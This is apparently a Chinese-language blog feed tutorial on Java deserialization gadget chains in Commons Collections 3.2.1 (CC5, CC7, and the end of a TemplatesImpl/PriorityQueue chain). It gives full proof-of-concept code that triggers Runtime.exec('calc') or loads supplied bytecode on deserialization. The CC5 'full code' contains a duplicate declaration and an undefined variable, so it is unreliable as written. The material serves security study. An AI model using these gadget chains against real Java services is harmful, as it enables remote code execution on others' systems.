<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="调试代码"><a href="#调试代码" class="headerlink" title="调试代码"></a>调试代码</h3><p>根据这个调用链去调试一下</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130436070.png" alt="image-20240601130436070"></p>
<p>进入<code>heapify()</code>方法中我们想调用<code>siftDown()</code></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) <span class="hljs-comment">//发现这个判断过不去</span><br>        <span class="hljs-built_in">siftDown</span>(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130808273.png" alt="image-20240601130808273"></p>
<p>size大小最低为2的时候才能过这个判断，进入<code>siftDown()</code>（size表示队列中当前元素的数量）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130816243.png" alt="image-20240601130816243"></p>
<p>所以我们知道了需要至少两个元素，当我们有两个元素之后，序列化的时候执行了所有代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601131409516.png" alt="image-20240601131409516"></p>
<p>因为<code>add()</code>方法最终会执行到<code>compare()</code>方法，导致序列化的时候就运行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601223552106.png" alt="image-20240601223552106"></p>
<p>那这并不是我们想要的，我们想要他反序列化的时候执行。  </p>
<p>修改方法如下:</p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br><br><br>    <span class="hljs-comment">//调用 ChainedTransformer.transform()。(这里放的是ConstantTransformer&lt;&gt;()，目的是序列化的时候不让这条链执行)</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>       <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>		<br>        <span class="hljs-comment">//反射修改transformingComparator的值为transformer，让其反序列化的时候让链连接起来</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC5</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/CC5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本质上也就是前面几条CC链改来改去，换了一个入口类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC5.png" alt="CC5"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>commons-collections 3.2.1</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>从上图可以看出来还是通过<code>LazyMap</code>调用<code>ChainedTransformer.transform()</code>最终调用<code>InvokerTransformer.transform()</code>执行代码</p>
<p>思路是一样的，找谁调用了<code>get()</code>方法，2000+结果，凭我们自己可能很难找到了，ysoserial中最终是找到了<code>TiedMapEntry.toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602153105891.png" alt="image-20240602153105891"></p>
<p><code>TiedMapEntry.toString</code>调用了<code>getValue()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602151949039.png" alt="image-20240602151949039"></p>
<p><code>TiedMapEntry.getValue()</code>最终调用了<code>get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152006941.png" alt="image-20240602152006941"></p>
<p>那接着就是找谁调用了<code>toString()</code>方法最好是在<code>readObject()</code>中，最终找到了<code>BadAttributeValueExpException.readObject()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152124747.png" alt="image-20240602152124747"></p>
<h2 id="CC5编写"><a href="#CC5编写" class="headerlink" title="CC5编写"></a>CC5编写</h2><p>从上面的图也可以看出来后半部分链其实和CC1或者CC6是一样的，复制粘贴没什么好说的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntry放入lazymap，TiedMapEntry的构造器中第一个为Map，第二个为Object。所以map就可以传入我们构造好的lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//构思是反序列化自动执行BadAttributeValueExpException.readObject()，因为BadAttributeValueExpException放入的是tiedMapEntry，那就会执行tiedMapEntry的readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>        <br></code></pre></td></tr></table></figure>

<h3 id="序列化自动执行的问题"><a href="#序列化自动执行的问题" class="headerlink" title="序列化自动执行的问题"></a>序列化自动执行的问题</h3><p>写了上面的代码发现，序列化的时候就自动执行了。调试一下就就知道，在<code>BadAttributeValueExpException</code>的构造器直接调用了<code>toString()</code>方法，导致序列化的时候执行完毕。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602154714433.png" alt="image-20240602154714433"></p>
<p>解决办法就是通过反射先放一个没用的东西在里面，序列化之前再把<code>tiedMapEntry</code>放进去。</p>
<p><code>BadAttributeValueExpException</code>也支持序列化，虽然当前类没有直接继承<code>Serializable</code>接口，但是它祖类<code>Throwable</code>继承了Serializable接口，所以<code>BadAttributeValueExpException</code>也支持序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Object<br>  ↳ java.lang.Throwable<br>    ↳ java.lang.Exception<br>      ↳ javax.management.BadAttributeValueExpException<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152143747.png" alt="image-20240602152143747"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntry放入lazymap，TiedMapEntry的构造器中第一个为Map，第二个为Object。所以map就可以传入我们构造好的lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//构思是反序列化自动执行BadAttributeValueExpException.readObject()，因为BadAttributeValueExpException放入的是tiedMapEntry，那就会执行tiedMapEntry的readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>		<br>        <span class="hljs-comment">//反射修改值</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BadAttributeValueExpException</span>&gt; c = badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(badAttributeValueExpException, tiedMapEntry);<br><br><br>        serialize(badAttributeValueExpException1);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC7</title>
    <url>/2024/06/04/JAVA%E5%AE%89%E5%85%A8/CC7/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC7本质上也是对CC1的改写，走到了万恶之源LazyMap最终导致反序列化。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC7.png" alt="CC7"></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><p><code>散列函数(哈希函数)</code>中心思想：</p>
<ul>
<li>不同参数返回不同哈希值</li>
<li>相同参数返回相同哈希值</li>
</ul>
<p>比如我输入葡萄返回10，输入西瓜返回3，下次输入西瓜还是返回3</p>
<p>(传入不同参数时，哈希值一定都不相同么？事实上任何算法在理论上都不能保证。这种参数不同结果相同的情况学名叫做“Hash冲突(Hash碰撞)”，CC7就利用了这个小技巧)</p>
<p>在遇到 hash 碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞。 在这之中使用的是父类 <code>AbstractMap</code> 的 <code>equals()</code> 方法。	</p>
<p>那<code>散列函数(哈希函数)</code>有什么意义呢？我们可以利用哈希值的特性，设计一张全新的表结构—-<code>散列表(哈希表 HashTable)</code></p>
<p><code>散列表（哈希表 HashTable）</code>，是根据关键码值(Key value)而直接进行访问的数据结构。</p>
<p>也就是说，它通过把关键码值,映射到表中一个位置来访问记录，这个映射函数叫做 散列函数(哈希函数)，存放记录的数组叫做散列表。<br>散列表(哈希表 HashTable)是由数组+链表实现的—-散列表底层保存在一个数组中，数组的索引由散列表的 <code>key.hashCode()</code>经过计算得到， 数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603225326444.png" alt="image-20240603225326444"></p>
<h3 id="HashMap继承关系"><a href="#HashMap继承关系" class="headerlink" title="HashMap继承关系"></a>HashMap继承关系</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160518210.png" alt="image-20240603160518210"></p>
<p>如上图所示<code>HashMap</code> 是<code>AbstractMap</code>的实现类， 同时这二者实现Map接口。</p>
<p>HashMap中没有实现Map接口的equals()方法，父类AbstractMapMap实现了equals()方法</p>
<h3 id="LazyMap继承关系"><a href="#LazyMap继承关系" class="headerlink" title="LazyMap继承关系"></a>LazyMap继承关系</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160438448.png" alt="image-20240603160438448"></p>
<p>LazyMap是AbstractMapDecorator的实现类同时这二者实现Map接口。</p>
<p>LazyMap中没有实现equals()方法，父类AbstractMapDecorator实现了equals()方法</p>
<p>(如果一个类实现了一个接口，那么该类必须实现接口中声明的所有方法，如果一个抽象类实现了一个接口，它可以选择不实现接口的所有方法，而把实现的责任交给它的具体子类)</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>猜想作者是受了CC6的启发，既然HashMap能实现反序列化漏洞，那HashTable是否也可以？最终是形成了CC7这条链。</p>
<hr>
<p><code>Hashtable</code>的<code>readObject()</code>调用了<code>reconstitutionPut()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">  table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>        threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>        count = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>            <br>首先创建一个Entry，这是上文讲到的散列表中的那个数组。<br>s是我们传入的输入流<br>然后进入<span class="hljs-keyword">for</span>循环反序列化赋值给 key,value，然后调用reconstitutionPut方法。<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155212582.png" alt="image-20240603155212582"></p>
<p>继续跟进 <code>reconstitutionPut()</code> 方法，之后我们看到 <code>reconstitutionPut()</code> 方法调用了 <code>equals()</code> 方法—-<code>e.key.equals(key)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <br><span class="hljs-comment">//通过key计算一个hash值，用这个值进行计算得到index。这个index就是前面创建的Entry数组的索引。</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>     <br><span class="hljs-comment">//比较哈希值e.hash是否与新键的哈希值hash相等。如果哈希值相等，再比较键 e.key 是否与新键 key 相等。如果两个条件都满足，则表示哈希表中已存在相同的键，抛出 StreamCorruptedException 异常。</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br><br>e.key.equals(key)其中两个key有什么不同？<br>e.key：这是当前哈希表（table）中某个位置（index）已存在的键。e是一个 Entry 对象，表示哈希表中一个槽位的链表中的一个节点。所以，e.key 是已经存储在哈希表中的键。<br>key：这是从反序列化输入流（ObjectInputStream）中读取的新键。这个键是在反序列化过程中从流中读取的，并且需要插入到哈希表中。<br><br>其中e.key可控，是因为在反序列化过程中，键和值是直接从输入流中读取的<br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155307188.png" alt="image-20240603155307188"></p>
<p>所以要看一下哪里有<code>equals()</code> 这个方法，找到了 <code>AbstractMapDecorator</code> 这个类中对map调用了equals()方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155442086.png" alt="image-20240603155442086"></p>
<p><code>return map.equals(object)</code>中map是什么？这里只是<code>AbstractMapDecorator</code> 中定义了一个名为 <code>map</code> 的字段，存储对另一个 <code>Map</code> 对象的引用。</p>
<p>这个类是继承了 Map 接口，但是 Map 是一个接口，我们需要去找 Map 的实现类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160438813.png" alt="image-20240604160438813"></p>
<p>上面最开始就说了AbstractMap实现了Map接口，并且实现了equals()方法</p>
<p>可以看见最终调用了<code>m.get()</code>方法，也就是如果<code>m</code>可控，则可以完成调用<code>LazyMap.get()</code>方法触发命令执行。在这里，<code>m</code>由传进来的参数<code>o</code>控制，也就是最初的<code>key</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160036081.png" alt="image-20240604160036081"></p>
<p>调用链</p>
